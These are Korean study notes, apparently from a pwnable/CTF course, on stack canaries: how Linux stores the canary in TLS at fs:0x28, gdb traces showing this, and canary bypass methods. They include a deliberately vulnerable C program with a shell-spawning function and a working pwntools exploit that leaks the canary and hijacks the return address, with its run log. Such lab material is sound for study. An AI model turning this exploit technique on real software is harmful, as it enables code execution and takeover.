# 배경
스택 카나리는 함수의 프롤로그에서 스택 버퍼와 반환 주소 사이에 임의의 값을 삽입하고, 
함수의 에필로그에서 해당 값의 변조를 확인하는 보호 기법
스택 프레임과 SFP 사이에 실행 시마다 바뀌는 램덤 값을 삽입
스택 버퍼 오버플로우로부터 반환 주소를 보호
만약 이 값이 바뀌게 되면 바로 실행 종료


# Canary 생성 과정
카나리 값은 프로세스가 시작될 때, TLS에 전역 변수로 저장되고, 각 함수마다 프롤로그와 에필로그에서 이 값을 참조
`fs`는 TLS를 가리키므로 `fs`의 값을 알면 TLS의 주소를 알 수 있지만 리눅스에서 `fs`의 값은 특정 시스템 콜을 사용해야만 조회하거나 설정할 수 있음
gdb에서 다른 레지스터의 값을 출력하듯 `info register fs`나, `print $fs`와 같은 방식으로는 값을 알 수 없음
`fs`의 값을 설정할 때 호출되는 `arch_prctl(int code, unsigned long addr)` 시스템 콜에 중단점을 설정하여 `fs`가 어떤 값으로 설정되는지 알 수 있음

```sh
$ gdb -q ./canary
pwndbg> catch syscall arch_prctl
Catchpoint 1 (syscall 'arch_prctl' [158])
pwndbg> run
```

`init_tls()` 안에서 catchpoint에 도달할 때까지 `continue` 명령어를 실행
catchpoint에 도달했을 때, rdi의 값이 `0x1002`인데 이 값은 `ARCH_SET_FS`의 상숫값임
rsi의 값이 `0x7ffff7d7f740`이므로, 이 프로세스는 TLS를 `0x7ffff7d7f740`에 저장할 것이며, `fs`는 이를 가리키게 될 것
한편, 카나리가 저장될 `fs+0x28`(`0x7ffff7d7f740+0x28`)의 값을 보면, 아직 어떠한 값도 설정되어 있지 않음을 확인할 수 있음

```sh
pwndbg> c
...
pwndbg> c
Continuing.
Catchpoint 1 (call to syscall arch_prctl), init_tls (naudit=naudit@entry=0) at ./elf/rtld.c:818
818 ./elf/rtld.c: No such file or directory.
...
─────────────[ REGISTERS / show-flags off / show-compact-regs off ]─────────────
*RAX  0xffffffffffffffda
*RBX  0x7fffffffe090 ◂— 0x1
*RCX  0x7ffff7fe3e1f (init_tls+239) ◂— test eax, eax
*RDX  0xffff80000827feb0
*RDI  0x1002
*RSI  0x7ffff7d7f740 ◂— 0x7ffff7d7f740
...
──────────────────────[ DISASM / x86-64 / set emulate on ]──────────────────────
 ► 0x7ffff7fe3e1f     test   eax, eax
   0x7ffff7fe3e21     jne    init_tls+320                
    ↓
   0x7ffff7fe3e70     lea    rsi, [rip + 0x11641]
   0x7ffff7fe3e77     lea    rdi, [rip + 0x11672]
   0x7ffff7fe3e7e     xor    eax, eax
   0x7ffff7fe3e80     call   _dl_fatal_printf                <_dl_fatal_printf>
   0x7ffff7fe3e85     nop    dword ptr [rax]
   0x7ffff7fe3e88     xor    ecx, ecx
   0x7ffff7fe3e8a     jmp    init_tls+161                
   0x7ffff7fe3e8f     lea    rcx, [rip + 0x11be2]          <__pretty_function__.14>
   0x7ffff7fe3e96     mov    edx, 0x31b
...
pwndbg> info register $rdi
rdi            0x1002              4098
pwndbg> info register $rsi
rsi            0x7ffff7d7f740      140737351513920
pwndbg> x/gx 0x7ffff7d7f740 + 0x28
0x7ffff7d7f768: 0x0000000000000000
pwndbg>
```

TLS의 주소를 알았으므로, gdb의 watch 명령어로 TLS+0x28에 값을 쓸 때를 확인
```sh
pwndbg> watch *(0x7ffff7d7f740+0x28)
Hardware watchpoint 4: *(0x7ffff7d7f740+0x28)
```

```sh
pwndbg> continue
Continuing.
Hardware watchpoint 4: *(0x7ffff7d7f740+0x28)
Old value = 0
New value = 2005351680
security_init () at rtld.c:870
870	in rtld.c
```


# Canary 활성화
카나리를 적용하여 컴파일하고, 긴 입력을 주면 `Segmentation fault`가 아니라 `stack smashing detected`와 `Aborted`라는 에러가 발생

```sh
$ gcc -o no_canary canary.c -fno-stack-protector
$ ./no_canaryHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHH
Segmentation fault
```

```sh
$ gcc -o canary canary.c
$ ./canary
HHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHH
*** stack smashing detected ***: <unknown> terminated
Aborted
```

```
   0x00000000000006b2 <+8>:     mov    rax,QWORD PTR fs:0x28     
   0x00000000000006bb <+17>:    mov    QWORD PTR [rbp-0x8],rax   
   0x00000000000006bf <+21>:    xor    eax,eax    
```

```
   0x00000000000006dc <+50>:    mov    rcx,QWORD PTR [rbp-0x8]    
   0x00000000000006e0 <+54>:    xor    rcx,QWORD PTR fs:0x28      
   0x00000000000006e9 <+63>:    je     0x6f0 <main+70>                   
   0x00000000000006eb <+65>:    call   0x570 <__stack_chk_fail@plt>
```

`fs:0x28`의 데이터를 읽는 부분이 있는데, `fs`는 세그먼트 레지스터의 일종으로, 리눅스는 프로세스가 시작될 때 `fs:0x28`에 랜덤 값을 저장함


# Canary 우회
1. Bruetforce
2. TLS 값 참조, 변조
3. 취약점 이용하여 Canary값 읽

# 예시1
```c
#include <stdio.h>
#include <stdlib.h>

void shell(){
    system("/bin/sh");
}

int main(void){
    setvbuf(stdin, 0, 2, 0);
    setvbuf(stdout, 0, 2, 0);
    char buf[50];

    read(0, buf, 200);
    printf(buf);
    read(0, buf, 200);

    return 0;
}
//gcc -fstack-protector -z execstack -no-pie -fno-pie -o canary_leak main.c
```

버퍼값 입력받고 출력한 후 다시 입력받는 구조
버퍼링 제거, canary 활성화, ASLR 비활성화, 코드 실행 스택 활성화

첫 번째 입력할 때, canary 직전까지 입력하면, `printf(buf);`까지 출력해서 canary값을 알아 낼 수 있음
이를 이용해서 shellcode 작성하면 exploit할 수 있음

버퍼 56바이트, Null 1바이트, canary 7바이트, SFP 8바이트, RET 8바이트
```
gef➤  x/100x 0x00007fffffffdde0
0x7fffffffdde0:	0x61616161	0x61616161	0x61616161	0x000a6161
0x7fffffffddf0:	0x00000000	0x00000000	0x00000000	0x00000000
0x7fffffffde00:	0x00000000	0x00000000	0x00000000	0x00000000
0x7fffffffde10:	0x00000000	0x00000000	0x195d3200	0x59df5a56
0x7fffffffde20:	0x00000001	0x00000000	0xf7c29d90	0x00007fff
0x7fffffffde30:	0x00000000	0x00000000	0x00401177	0x00000000
```

```python
from pwn import *

shell=0x0000000000401166
main_ret=0x000000000040122b

#p = gdb.debug('./canary_leak')
p = process('./canary_leak')
context.log_level = 'debug'

payload=b'a'*57
p.send(payload)

p.recvuntil("a"*57)

canary_value=b'\x00'+p.recv(7)

payload=b''
payload+=b'a'*56
payload+=canary_value
payload+=b'a'*8
payload+=p64(main_ret)
payload+=p64(shell)

p.sendline(payload)

p.interactive()
```

아래는 exploit한 결과임
canary는 0x39에서 0x3F까지 총 7바이트
shelllcode를 넣을 때 canary도 그대로 재현해서 넣은 모습
```sh
┌──(foo1㉿main-server)-[~/Desktop/kknock/Pwnable/canary_leak]
└─$ python3 exploit.py 
[+] Starting local process './canary_leak': pid 4915
[DEBUG] Sent 0x39 bytes:
    b'a' * 0x39
/home/foo1/Desktop/kknock/Pwnable/canary_leak/exploit.py:13: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  p.recvuntil("a"*57)
[DEBUG] Received 0x41 bytes:
    00000000  61 61 61 61  61 61 61 61  61 61 61 61  61 61 61 61  │aaaa│aaaa│aaaa│aaaa│
    *
    00000030  61 61 61 61  61 61 61 61  61 af 04 83  f1 8d 76 75  │aaaa│aaaa│a···│··vu│
    00000040  01                                                  │·│
    00000041
[DEBUG] Sent 0x59 bytes:
    00000000  61 61 61 61  61 61 61 61  61 61 61 61  61 61 61 61  │aaaa│aaaa│aaaa│aaaa│
    *
    00000030  61 61 61 61  61 61 61 61  00 af 04 83  f1 8d 76 75  │aaaa│aaaa│····│··vu│
    00000040  61 61 61 61  61 61 61 61  2b 12 40 00  00 00 00 00  │aaaa│aaaa│+·@·│····│
    00000050  66 11 40 00  00 00 00 00  0a                        │f·@·│····│·│
    00000059
[*] Switching to interactive mode
```


# 예시2
[[Dreamhack - Return_to_Shellcode]]